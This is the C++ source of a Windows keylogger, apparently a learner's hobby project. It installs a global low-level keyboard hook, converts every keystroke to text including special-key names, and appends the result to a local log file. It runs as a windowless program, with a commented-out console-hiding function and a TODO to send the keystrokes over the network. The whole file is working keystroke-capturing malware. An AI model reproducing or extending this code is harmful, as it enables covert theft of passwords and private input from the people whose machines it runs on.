// My goofy ahh keylogger program
// TODO: Sending keystrokes through network
// I am not experienced in C++, I am just learning it
// I don't even know a lot of keywords
// I am more of a C programmer so this is new

#include <windows.h>
#include <winuser.h>
#include <iostream>
#include <fstream>
#include "vkCodes.h"

HHOOK hhook;
std::ofstream logfile("../output/Keys.txt", std::ios::app);

// TODO: Better keystrokes such as determine whether it is capital
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        auto* p = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
        DWORD vkCode = p->vkCode;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            BYTE kbs[256];
            GetKeyboardState(kbs);

            WCHAR buffer[4] = {0};
            UINT scan = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
            int result = ToUnicode(vkCode, scan, kbs, buffer, 4, 0);

            if (result == 1 && buffer[0] >= 32 && buffer[0] < 127) {
                // Printable character
                logfile << (char)buffer[0];
            } else {
                // Non-printable, log name
                char* name = keyboard_get_virtual_key_code_name(vkCode);
                if (vkCode == VK_RETURN)
                    logfile << "\n" << " [ENTER] " << "\n";

                else if (name && *name) {
                    logfile << " [" << name << "] ";
                }
            }
            logfile.flush();
        }
        else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
            // To make sure the keys won't get stuck
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// void HideConsole() {
//     ShowWindow(GetConsoleWindow(), SWP_HIDEWINDOW);
// }

DWORD WINAPI KeyloggerThread(LPVOID) {
    hhook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);

    // Chatgpt ahh shit
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }

    return 0;
}

int __stdcall wWinMain(
    HINSTANCE instance,
    HINSTANCE previousInstance,
    PWSTR arguments,
    int commandShow) {

    CreateThread(nullptr, 0, KeyloggerThread, nullptr, 0, nullptr);

    while (true) {
        Sleep(100);
    }
}
